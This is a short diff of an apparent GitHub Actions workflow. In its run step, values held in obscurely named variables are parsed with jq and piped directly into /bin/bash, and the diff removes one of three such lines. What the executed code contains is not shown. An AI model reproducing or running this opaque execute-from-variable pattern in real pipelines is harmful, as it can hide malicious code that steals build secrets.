@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$wx33460" | jq -r .jmhiv240 | /bin/bash
           echo $b76 | jq -r .g4429 | /bin/bash
-          printf '%s' "$tsu597" | jq -r .gy9 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
